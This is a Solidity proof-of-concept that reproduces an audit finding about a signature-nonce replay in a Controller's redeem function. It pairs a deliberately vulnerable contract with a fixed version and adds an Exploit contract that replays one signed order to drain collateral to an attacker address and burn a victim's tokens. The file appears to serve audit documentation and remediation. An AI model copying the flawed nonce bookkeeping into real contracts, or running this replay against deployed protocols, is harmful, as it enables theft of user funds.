// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Tenbin finding 64973:
// "Redeem nonce mis-tracked enables replay" (Spearbit, Controller.sol L306-307).
//
// Controller.redeem validates the PAYER's nonce (_verifyNonce(order.payer,...)
// inside verifyOrder) but records usage under the recovered SIGNER's slot
// (nonces[signer][order.nonce] = true). When a payer delegates a signer, signer
// != payer, so the payer's nonce slot is NEVER written. One signed redeem order
// can therefore be replayed endlessly: each pass re-validates the still-unused
// payer nonce, transfers collateral from the manager to order.recipient, and
// burns order.payer's assets.
//
// The vulnerable redeem body is inlined VERBATIM from the finding. verifyOrder /
// _verifyNonce are faithful doubles that preserve the exact check-vs-record slot
// asymmetry (the actual bug); only the ECDSA recovery is replaced by a
// delegated-signer field carried in the Signature struct — legitimate because
// the finding is nonce bookkeeping, not signature validity.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @dev Minimal faithful double for OpenZeppelin's SafeERC20 (used by the real
///      Controller as `IERC20(...).safeTransferFrom(...)`).
library SafeERC20 {
    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        require(token.transferFrom(from, to, value), "SafeERC20: transferFrom failed");
    }
}

/// @dev Minimal ERC20 double for the opaque collateral token. The manager holds
///      it and approves the Controller to pull it on redeem.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Minimal faithful double for the protocol's AssetToken: a burnable ERC20
///      whose burn() is authorized to the Controller (the real minter/burner).
contract AssetToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    address public burner;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function setBurner(address who) external {
        burner = who;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        require(msg.sender == burner, "AssetToken: not burner");
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

/// @dev Faithful double for the manager treasury: holds collateral and approves
///      the Controller to pull it, exactly as the real manager does.
contract Manager {
    function approveCollateral(address token, address spender, uint256 amount) external {
        IERC20(token).approve(spender, amount);
    }
}

/// @dev The order/signature schema. The Signature carries the delegated signer
///      the real verifyOrder would recover via ECDSA (replaced faithfully here).
struct Order {
    address payer;
    address recipient;
    address collateral_token;
    uint256 collateral_amount;
    uint256 asset_amount;
    uint256 nonce;
}

struct Signature {
    address signer;
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE Controller (redeem body inlined VERBATIM from the finding).
// ─────────────────────────────────────────────────────────────────────────────
contract Controller {
    using SafeERC20 for IERC20;

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    address public manager;
    address public asset;

    mapping(address => bool) public hasMinterRole;
    mapping(address => mapping(uint256 => bool)) public nonces;

    constructor(address _manager, address _asset) {
        manager = _manager;
        asset = _asset;
    }

    modifier onlyRole(bytes32) {
        require(hasMinterRole[msg.sender], "missing MINTER_ROLE");
        _;
    }

    function grantMinter(address who) external {
        hasMinterRole[who] = true;
    }

    /// @dev Faithful double: validates the PAYER's nonce (as the real
    ///      _verifyNonce does), reverting if it was already consumed.
    function _verifyNonce(address account, uint256 nonce) internal view {
        require(!nonces[account][nonce], "nonce used");
    }

    /// @dev Faithful double: checks the payer nonce and returns the (delegated)
    ///      signer carried in the signature — the exact contract the real
    ///      verifyOrder honours, minus the ECDSA recovery.
    function verifyOrder(Order calldata order, Signature calldata signature)
        public
        view
        returns (address signer, bool ok)
    {
        _verifyNonce(order.payer, order.nonce); // checks payer nonce
        return (signature.signer, true);
    }

    // ── verbatim vulnerable redeem (Controller.sol L306-307) ──────────────────
    function redeem(Order calldata order, Signature calldata signature) external onlyRole(MINTER_ROLE) {
        (address signer,) = verifyOrder(order, signature); // checks payer nonce
        nonces[signer][order.nonce] = true; // @> records SIGNER's nonce, not the payer's — the payer nonce checked above is never consumed, so a delegated order replays
        IERC20(order.collateral_token).safeTransferFrom(manager, order.recipient, order.collateral_amount);
        AssetToken(asset).burn(order.payer, order.asset_amount);
    }
    // ──────────────────────────────────────────────────────────────────────────
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED Controller: records the nonce against the PAYER (the recommended fix),
// so a delegated redeem order cannot be replayed.
// ─────────────────────────────────────────────────────────────────────────────
contract ControllerFixed {
    using SafeERC20 for IERC20;

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    address public manager;
    address public asset;

    mapping(address => bool) public hasMinterRole;
    mapping(address => mapping(uint256 => bool)) public nonces;

    constructor(address _manager, address _asset) {
        manager = _manager;
        asset = _asset;
    }

    modifier onlyRole(bytes32) {
        require(hasMinterRole[msg.sender], "missing MINTER_ROLE");
        _;
    }

    function grantMinter(address who) external {
        hasMinterRole[who] = true;
    }

    function _verifyNonce(address account, uint256 nonce) internal view {
        require(!nonces[account][nonce], "nonce used");
    }

    function verifyOrder(Order calldata order, Signature calldata signature)
        public
        view
        returns (address signer, bool ok)
    {
        _verifyNonce(order.payer, order.nonce);
        return (signature.signer, true);
    }

    function redeem(Order calldata order, Signature calldata signature) external onlyRole(MINTER_ROLE) {
        (address signer,) = verifyOrder(order, signature);
        nonces[order.payer][order.nonce] = true; // FIX: consume the PAYER's nonce, matching the verification key
        signer; // silence unused
        IERC20(order.collateral_token).safeTransferFrom(manager, order.recipient, order.collateral_amount);
        AssetToken(asset).burn(order.payer, order.asset_amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a malicious relayer (MINTER_ROLE) replays ONE signed redeem
// order N times. payer=VICTIM, delegated signer=DELEGATE (!= payer),
// recipient=ATTACKER. Each replay drains collateral to the attacker and burns
// the victim's assets, because the payer's nonce slot is never written.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x000000000000000000000000000000000000b0b0; // payer whose assets are burned
    address internal constant DELEGATE = 0x00000000000000000000000000000000de1E6A7E; // delegated signer (!= payer)

    uint256 internal constant REPLAYS = 3;
    uint256 internal constant COLLATERAL_AMOUNT = 1000 ether;
    uint256 internal constant ASSET_AMOUNT = 500 ether;
    uint256 internal constant NONCE = 42;

    // Exposed results.
    uint256 public attackerCollateral;
    uint256 public victimAssetRemaining;
    uint256 public victimAssetBurned;
    uint256 public replays;
    address public collateralAddr;
    address public assetAddr;
    address public controllerAddr;

    function run() external payable {
        address victim = VICTIM;

        // --- deploy doubles + the vulnerable Controller (fixed order) ---
        MiniToken collateral = new MiniToken("Collateral", "COLL");        // nonce 1
        AssetToken assetToken = new AssetToken("Asset", "AST");            // nonce 2
        Manager mgr = new Manager();                                       // nonce 3
        Controller controller = new Controller(address(mgr), address(assetToken)); // nonce 4

        collateralAddr = address(collateral);
        assetAddr = address(assetToken);
        controllerAddr = address(controller);
        replays = REPLAYS;

        // --- wiring: controller may burn asset; this contract is the relayer ---
        assetToken.setBurner(address(controller));
        controller.grantMinter(address(this));

        // --- fund the manager treasury and approve the controller to pull ---
        collateral.mint(address(mgr), REPLAYS * COLLATERAL_AMOUNT);
        mgr.approveCollateral(address(collateral), address(controller), type(uint256).max);

        // --- pre-fund the victim (payer) with assets to be burned each replay ---
        assetToken.mint(victim, REPLAYS * ASSET_AMOUNT);

        // --- ONE signed order: delegated signer (!= payer) makes it replayable ---
        Order memory order = Order({
            payer: victim,
            recipient: ATTACKER,
            collateral_token: address(collateral),
            collateral_amount: COLLATERAL_AMOUNT,
            asset_amount: ASSET_AMOUNT,
            nonce: NONCE
        });
        Signature memory sig = Signature({signer: DELEGATE});

        // --- replay the SAME order REPLAYS times ---
        for (uint256 i = 0; i < REPLAYS; i++) {
            controller.redeem(order, sig);
        }

        attackerCollateral = collateral.balanceOf(ATTACKER);
        victimAssetRemaining = assetToken.balanceOf(victim);
        victimAssetBurned = REPLAYS * ASSET_AMOUNT - victimAssetRemaining;

        // --- HARM: one signed order drained REPLAYS * collateral_amount to the attacker ---
        require(attackerCollateral == REPLAYS * COLLATERAL_AMOUNT, "replay theft did not reproduce");
        require(victimAssetRemaining == 0, "victim assets not burned on each replay");
    }
}
